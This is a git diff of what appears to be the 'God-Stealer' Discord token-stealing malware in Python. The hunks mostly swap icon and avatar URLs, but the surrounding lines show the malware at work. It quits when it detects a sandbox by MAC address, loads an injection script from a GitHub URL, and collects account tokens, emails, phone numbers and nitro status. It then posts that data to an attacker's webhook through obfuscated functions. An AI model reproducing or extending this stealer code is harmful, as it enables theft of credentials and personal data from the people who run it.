@@ -44,13 +44,13 @@ BLACKLIST1 = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00
 
 mac_address = uuid.getnode()
 if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
-    os._exit(0)
+    os._exit(0) 
 
 
 
 
 wh00k = "WEBHOOK HERE"
-inj_url = "https://raw.githubusercontent.com/Tropxzz/God-stealer/main/Injection.js"
+inj_url = "     https://raw.githubusercontent.com/Tropxzz/God-stealer/main/Injection.js"
     
 DETECTED = False
 def g3t1p():
@@ -355,7 +355,7 @@ def upl05dT4k31(t0k3n, path):
     us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)
 
     if pfp == None: 
-        pfp = "https://i.imgur.com/S0Zqp4R.jpg"
+        pfp = "https://i.pinimg.com/originals/3f/04/f7/3f04f76d28a2253ec55513f1ca2b6f78.jpg"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
@@ -415,14 +415,14 @@ def upl05dT4k31(t0k3n, path):
                 },
             "footer": {
                 "text": "God-Stealer",
-                "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
+                "icon_url": "https://i.pinimg.com/originals/3f/04/f7/3f04f76d28a2253ec55513f1ca2b6f78.jpg"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://i.imgur.com/S0Zqp4R.jpg",
+        "avatar_url": "https://i.pinimg.com/originals/3f/04/f7/3f04f76d28a2253ec55513f1ca2b6f78.jpg",
         "username": "God Stealer",
         "attachments": []
         }
@@ -456,12 +456,12 @@ def upload(name, link):
                     "color": 2895667,
                     "footer": {
                         "text": "God Stealer",
-                        "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
+                        "icon_url": "https://i.pinimg.com/originals/3f/04/f7/3f04f76d28a2253ec55513f1ca2b6f78.jpg"
                     }
                 }
             ],
             "username": "God Stealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+            "avatar_url": "https://i.pinimg.com/originals/3f/04/f7/3f04f76d28a2253ec55513f1ca2b6f78.jpg",
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
